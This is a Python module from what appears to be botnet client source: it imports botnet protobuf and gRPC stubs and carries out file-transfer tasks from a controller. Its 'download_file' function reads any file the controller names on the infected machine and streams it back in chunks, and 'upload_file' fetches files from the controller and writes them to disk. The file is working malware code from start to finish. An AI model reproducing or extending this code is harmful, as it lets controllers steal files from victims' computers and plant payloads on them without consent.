import os.path
from bot.modules import tiempo
from protos.botnet_pb2 import *
from protos.botnet_pb2_grpc import *

def save_file(location, data):
    f = open(location, "wb")
    f.write(data)
    f.close()

def get_file(location):
    try:
        f = open(location, "rb")
        data = f.read()
        f.close()
        return data
    except:
        return None

def exist(location):
    return os.path.isfile(location)

def read_chunks(location, chunk_size=4096):
    try:
        with open(location, "rb") as f:
            while True:
                data = f.read(chunk_size)
                if not data:
                    break
                yield data
    except:
        yield b""

def upload_file(client, task):
    data = b""
    status = 0
    filename = ""
    c = 0
    for chunk in client.GetFile(File(bot_id=task.bot_id, file=task.file)):
        if c == 0:
            filename = chunk.filename
            status = chunk.status
            if status == 0:
                break
        else:
            data += chunk.data
        c += 1
    date_finish = tiempo.get_time()
    if data == b"":
        return Task(task_id=task.task_id, bot_id=task.bot_id, type=task.type, status="MISSING", date_start=task.date_start, date_finish=date_finish, file=task.file, response=filename)
    else:
        save_file(filename, data)
        return Task(task_id=task.task_id, bot_id=task.bot_id, type=task.type, status="OK", date_start=task.date_start, date_finish=date_finish, file=task.file, response=filename)

def download_file(client, task):
    array = []
    filename = os.path.basename(task.file)
    status = ""
    if exist(task.file):
        array.append(Chunk(bot_id=task.bot_id, status="OK", filename=filename, data=b""))
        for data in read_chunks(task.file):
            array.append(Chunk(bot_id=task.bot_id, status="OK", filename="", data=data))
        status = "OK"
    else:
        array.append(Chunk(bot_id=task.bot_id, status="MISSING", filename="", data=b""))
        status = "MISSING"
    iterator = iter(array)
    client.SendFile(iterator)
    date_finish = tiempo.get_time()
    return Task(task_id=task.task_id, bot_id=task.bot_id, type=task.type, status=status, date_start=task.date_start, date_finish=date_finish, file=task.file, response=filename)